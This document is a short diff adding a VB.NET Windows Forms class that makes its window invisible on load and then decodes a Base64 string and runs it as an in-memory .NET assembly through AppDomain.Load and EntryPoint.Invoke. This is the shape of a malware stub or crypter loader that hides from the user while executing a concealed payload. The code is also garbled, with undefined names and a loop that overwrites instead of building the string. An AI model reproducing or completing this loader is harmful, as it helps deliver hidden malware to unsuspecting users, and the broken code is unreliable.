@@ -1,0 +1,18 @@
+Public Class Form1 
+Public Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+Me.Hide()
+Me.ShowInTaskbar = False
+Me.ShowIcon = False
+Me.Opacity = 0
+maloumat
+Dim str2 As String = ""
+Dim num3 As Integer = paracetamol1.Length
+Dim i As Integer = 1 
+Do While (i <= num3) 
+str2 = rahj
+i += 1
+Loop
+Dim best As Object = AppDomain.CurrentDomain.Load(Convert.FromBase64String(str2))
+Dim gest As String = best.EntryPoint.Invoke(Nothing, Nothing)
+End Sub
+End Class
